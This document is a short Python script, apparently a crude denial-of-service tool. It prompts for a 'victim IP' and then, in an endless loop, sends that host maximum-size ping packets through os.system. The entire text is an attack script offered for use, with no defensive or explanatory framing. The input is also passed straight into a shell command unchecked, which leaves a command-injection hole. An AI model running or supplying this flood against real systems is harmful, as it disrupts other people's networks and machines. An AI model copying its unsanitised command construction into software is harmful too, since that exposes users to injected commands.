import os

def main():
    victimIP = input("enter victim IP: ")
    pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
        
    while(1):
        os.system(pingCommand)

main()